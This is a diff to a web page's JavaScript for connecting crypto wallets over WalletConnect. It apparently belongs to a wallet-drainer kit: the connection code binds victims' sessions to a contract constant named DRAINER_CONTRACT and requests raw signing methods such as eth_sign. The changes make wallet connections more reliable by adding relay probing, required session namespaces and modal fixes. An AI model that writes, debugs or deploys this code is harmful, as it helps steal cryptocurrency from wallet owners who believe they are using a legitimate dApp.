@@ -18,6 +18,14 @@ import { CONFIG } from './config.js';
   const PRIMARY_PROJECT_ID  = PROJECT_ID;
   const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;
 
+  const RELAY_URLS = [
+    'wss://relay.walletconnect.com',
+    'wss://relay.walletconnect.org',
+  ];
+
+  // CAIP-2 chain strings required by WalletConnectModal
+  const WC_CHAINS = [`eip155:${MAINNET_ID}`];
+
   // ==========================================================================
   //  PLATFORM
   // ==========================================================================
@@ -150,6 +158,29 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
+  //  RELAY REACHABILITY
+  // ==========================================================================
+  async function pickRelayUrl(timeoutMs = 2500) {
+    for (const url of RELAY_URLS) {
+      try {
+        const ok = await withTimeout(
+          new Promise((resolve) => {
+            const ws = new WebSocket(url);
+            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
+            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
+            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
+          }),
+          timeoutMs + 500,
+          `ws-probe ${url}`
+        );
+        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
+      } catch { /* try next */ }
+    }
+    logDebug('⚠️ No relay reachable — using SDK default');
+    return null;
+  }
+
+  // ==========================================================================
   //  DOM
   // ==========================================================================
   const connectButton = document.getElementById('connectButton');
@@ -164,13 +195,14 @@ import { CONFIG } from './config.js';
   let Web3Ctor = null;
 
   let wcProvider = null;
+  let wcModal = null;           // one modal per connection attempt
   let injectedProvider = null;
   let activeProvider = null;
   let web3Instance = null;
   let contractInstance = null;
   let isConnecting = false;
   let isDisconnecting = false;
-  let connectionMode = null; // 'walletconnect' | 'injected' | null
+  let connectionMode = null;
 
   // ==========================================================================
   //  BUTTON UI
@@ -239,7 +271,10 @@ import { CONFIG } from './config.js';
   // ==========================================================================
   //  LOCAL STORAGE
   // ==========================================================================
-  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
+  const LS = {
+    addr: 'connectedWallet',
+    mode: 'connectionMode',
+  };
   const saveWallet = (address, mode) => {
     localStorage.setItem(LS.addr, address);
     if (mode) localStorage.setItem(LS.mode, mode);
@@ -390,11 +425,6 @@ import { CONFIG } from './config.js';
 
   // ==========================================================================
   //  WALLETCONNECT INIT
-  //  ❗ THE CRITICAL FIX:
-  //  Never pass `chains`, `methods`, or `events` — those create REQUIRED
-  //  namespaces and cause wallets to reject the session with
-  //  “Connection declined” or “Unsupported wc_ method”.
-  //  Use `optionalChains`, `optionalMethods`, `optionalEvents` instead.
   // ==========================================================================
   async function initWalletConnect({ useFallbackId = false } = {}) {
     if (wcProvider) return wcProvider;
@@ -406,25 +436,21 @@ import { CONFIG } from './config.js';
     }
 
     try {
+      const relayUrl = await pickRelayUrl();
+
       logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}…`);
       const t0 = performance.now();
 
       const opts = {
         projectId,
-        // ✅ ONLY optionalChains — never `chains`
+        chains: [MAINNET_ID],
         optionalChains: [MAINNET_ID],
-        showQrModal: false, // we render our own modal via WalletConnectModal
-        // ✅ ONLY optionalMethods — never `methods`
-        optionalMethods: [
-          'eth_sendTransaction',
-          'personal_sign',
-          'eth_signTypedData_v4',
-          'eth_sign',
-        ],
-        // ✅ ONLY optionalEvents — never `events`
-        optionalEvents: ['chainChanged', 'accountsChanged'],
+        showQrModal: false, // we render our own modal
+        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
+        events: ['chainChanged', 'accountsChanged'],
         metadata: DAPP_METADATA,
       };
+      if (relayUrl) opts.relayUrl = relayUrl;
 
       wcProvider = await withTimeout(
         EthereumProvider.init(opts),
@@ -475,6 +501,11 @@ import { CONFIG } from './config.js';
 
     provider.on('disconnect', (reason) => {
       logDebug(`WC disconnect: ${reason}`);
+      hardDisconnect({ skipWalletCall: true });
+    });
+
+    provider.on('session_delete', () => {
+      logDebug('WC session_delete');
       hardDisconnect({ skipWalletCall: true });
     });
   }
@@ -569,13 +600,13 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  WALLETCONNECT CONNECT
+  //  WALLETCONNECT CONNECT  (modal is created here, with chains)
   // ==========================================================================
   async function connectWalletConnect({ useFallbackId = false } = {}) {
     const provider = await initWalletConnect({ useFallbackId });
     if (!provider) return null;
 
-    // If already has an active session, sync UI.
+    // If a session already exists (restored or previously approved), sync UI.
     if (provider.session) {
       const accounts = provider.accounts;
       if (accounts?.length) {
@@ -590,12 +621,13 @@ import { CONFIG } from './config.js';
       }
     }
 
-    // Manual modal handling (showQrModal:false)
+    // ----- create ONE modal for this attempt -----
     let modalController = null;
     if (WalletConnectModal && !isMobileDevice) {
       try {
         modalController = new WalletConnectModal({
           projectId: useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID,
+          chains: WC_CHAINS,                 // <-- THE FIX
           themeMode: 'dark',
           themeVariables: {
             '--wcm-z-index': '9999',
@@ -604,28 +636,36 @@ import { CONFIG } from './config.js';
           },
           enableExplorer: true,
         });
-      } catch (e) { logDebug('Modal init: ' + e.message); }
+      } catch (e) {
+        logDebug('Modal init: ' + e.message);
+      }
     }
 
+    // ----- one-shot display_uri handler -----
     let uriShown = false;
     const onUri = (uri) => {
       if (uriShown) return;
       uriShown = true;
-      try { modalController?.openModal({ uri }); } catch (e) { logDebug('openModal: ' + e.message); }
+      logDebug(`display_uri received (len=${uri?.length || 0})`);
+      try {
+        modalController?.openModal({ uri });
+      } catch (e) {
+        logDebug('openModal: ' + e.message);
+      }
     };
     provider.on('display_uri', onUri);
 
     showStatus('Opening wallet…', 'info');
 
     try {
-      // enable() = connect() + eth_requestAccounts
+      // enable() triggers pairing and waits for session approval.
       const accounts = await provider.enable();
+
       provider.removeListener?.('display_uri', onUri);
       try { modalController?.closeModal(); } catch {}
 
       if (!accounts?.length) {
         logDebug('WC enable returned no accounts');
-        showStatus('Wallet did not return an account', 'error');
         return null;
       }
 
@@ -642,16 +682,16 @@ import { CONFIG } from './config.js';
     } catch (e) {
       provider.removeListener?.('display_uri', onUri);
       try { modalController?.closeModal(); } catch {}
-      const msg = e?.message || String(e);
-      logDebug('WC enable error: ' + msg);
+      logDebug('WC enable error: ' + e.message);
 
-      if (/rejected|user rejected|user closed|connection declined/i.test(msg)) {
-        logDebug('User/wallet rejected WC session');
-        showStatus('Connection declined by wallet', 'error');
+      if (/rejected|user rejected|user closed/i.test(e.message || '')) {
+        logDebug('User rejected WC');
         return null;
       }
-      showStatus('WalletConnect failed: ' + msg, 'error');
       return null;
+    } finally {
+      // always drop the modal reference so the next attempt gets a fresh one
+      modalController = null;
     }
   }
 
@@ -785,18 +825,16 @@ import { CONFIG } from './config.js';
     if (savedMode === 'walletconnect' || !savedMode) {
       try {
         const provider = await initWalletConnect({ useFallbackId: false });
-        if (provider) {
-          if (provider.session && provider.accounts?.length) {
-            const a = provider.accounts[0];
-            activeProvider = provider;
-            connectionMode = 'walletconnect';
-            web3Instance = new Web3Ctor(provider);
-            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-            saveWallet(a, 'walletconnect');
-            updateConnectedUI(a, 'evm');
-            logDebug(`♻️ WC session restored: ${a}`);
-            return;
-          }
+        if (provider && provider.session && provider.accounts?.length) {
+          const a = provider.accounts[0];
+          activeProvider = provider;
+          connectionMode = 'walletconnect';
+          web3Instance = new Web3Ctor(provider);
+          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+          saveWallet(a, 'walletconnect');
+          updateConnectedUI(a, 'evm');
+          logDebug(`♻️ WC session restored: ${a}`);
+          return;
         }
       } catch (e) {
         logDebug('WC restore: ' + e.message);
@@ -834,7 +872,10 @@ import { CONFIG } from './config.js';
   //  BOOT
   // ==========================================================================
   try {
-    const libs = await loadWalletConnectLibraries();
+    const [libs] = await Promise.all([
+      loadWalletConnectLibraries(),
+      pickRelayUrl().catch(() => null),
+    ]);
     EthereumProvider   = libs.EthereumProvider;
     WalletConnectModal = libs.WalletConnectModal;
     Web3Ctor           = libs.Web3;
@@ -859,7 +900,7 @@ import { CONFIG } from './config.js';
   //  WINDOW EVENTS
   // ==========================================================================
   window.addEventListener('beforeunload', () => {
-    // Nothing to await here; modal cleanup is handled by the provider.
+    // Never await here; just close the QR modal if open.
   });
 
   logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
